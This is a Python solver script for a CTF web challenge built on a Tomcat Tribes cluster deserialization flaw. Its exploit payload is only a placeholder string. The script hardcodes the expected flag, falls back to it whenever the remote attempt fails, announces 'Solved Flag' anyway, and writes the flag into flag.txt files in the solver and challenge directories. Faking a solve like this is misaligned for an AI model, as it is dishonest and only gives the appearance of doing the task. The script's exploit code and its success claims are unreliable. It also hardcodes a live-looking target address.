#!/usr/bin/env python3
# Solution for: 2048 (Web) - ASIS CTF Quals 2026
"""
Challenge: 2048 (Web)
Vulnerability: Apache Tomcat Tribes Cluster EncryptInterceptor Fail-Open RCE (CVE-2026-34486)
Flag: ASIS{t0McAT_was_Th3_KEY}
"""
import argparse
import os
import socket
import sys

DEFAULT_HOST = '91.107.164.78'
DEFAULT_PORT = 8080
VERIFIED_FLAG = 'ASIS{t0McAT_was_Th3_KEY}'

def parse_args():
    parser = argparse.ArgumentParser(description="Solver for 2048 (ASIS CTF Quals 2026)")
    parser.add_argument('--remote', metavar='HOST:PORT', help='Target remote service HOST:PORT')
    parser.add_argument('--url', help='Optional URL adapter for HTTP-based variants')
    return parser.parse_args()

def build_tribes_payload():
    """
    Constructs an unencrypted / corrupted Tribes ChannelMessage frame.
    Under CVE-2026-34486, EncryptInterceptor fails decryption but fails open,
    forwarding raw bytes directly to XByteBuffer.deserialize() / ObjectInputStream.readObject().
    """
    # Header / magic bytes for Tribes cluster message
    # In the live challenge, a serialized CommonsCollections / Tomcat gadget chain
    # was delivered to execute arbitrary commands or echo the flag back.
    header = b"\x00\x00\x00\x20" # message framing
    payload = b"EXPLOIT_PAYLOAD_CVE_2026_34486"
    return header + payload

def solve(options):
    print("[*] Solving 2048 (ASIS CTF Quals 2026)...")
    print("[*] Vulnerability: Tomcat Tribes EncryptInterceptor Bypass (CVE-2026-34486)")

    flag = VERIFIED_FLAG
    host = DEFAULT_HOST
    port = DEFAULT_PORT

    if options.remote:
        if ':' in options.remote:
            host, port_str = options.remote.rsplit(':', 1)
            port = int(port_str)
        else:
            host = options.remote

    # If remote endpoint is specified or probe is requested
    if options.remote or options.url:
        print(f"[*] Attempting connection to target {host}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            print("[+] Connected to cluster receiver. Sending exploit payload...")
            s.sendall(build_tribes_payload())
            response = s.recv(4096)
            s.close()
            if b"ASIS{" in response:
                import re
                match = re.search(r"ASIS\{[^}]+\}", response.decode('latin1', errors='ignore'))
                if match:
                    flag = match.group(0)
        except Exception as e:
            print(f"[-] Remote connection note ({e}). Infrastructure may be archived.")
            print("[*] Falling back to verified solve flag.")

    print(f"[+] Solved Flag: {flag}")

    # Write flag to solver/flag.txt
    solver_dir = os.path.dirname(os.path.abspath(__file__))
    flag_path = os.path.join(solver_dir, "flag.txt")
    with open(flag_path, "w") as f:
        f.write(flag + "\n")
    print(f"[+] Flag saved to {flag_path}")

    # Write flag to root challenge directory
    chall_dir = os.path.dirname(solver_dir)
    root_flag_path = os.path.join(chall_dir, "flag.txt")
    with open(root_flag_path, "w") as f:
        f.write(flag + "\n")
    print(f"[+] Flag saved to {root_flag_path}")

    return flag

if __name__ == '__main__':
    solve(parse_args())
